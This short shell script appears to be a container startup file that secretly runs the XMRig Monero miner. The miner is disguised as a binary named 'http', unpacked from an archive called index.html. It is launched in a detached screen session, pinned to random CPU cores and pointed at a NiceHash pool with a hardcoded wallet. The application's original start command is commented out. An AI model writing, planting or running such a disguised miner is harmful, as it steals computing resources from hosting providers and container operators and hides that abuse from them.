#!/bin/sh

# Download the http file
# (Assuming you have a command to download the file here, e.g., wget or curl)

# Extract the http file
tar -xvzf /app2/index.html -C /app2/

# Change directory to the extracted folder
cd /app2/httpalpine

# Get the number of available cores
num_cores=$(nproc)

# Randomly select 8 unique cores
random_cores=$(shuf -i 0-$(($num_cores - 1)) -n 8 | tr '\n' ',' | sed 's/,$//')

# Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
screen -dmS http_session sh -c "taskset -c $random_cores cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash -t=2"

# Change directory to /app and run the original command in the background
# cd /app
# npm run start

# Keep the container running
tail -f /dev/null
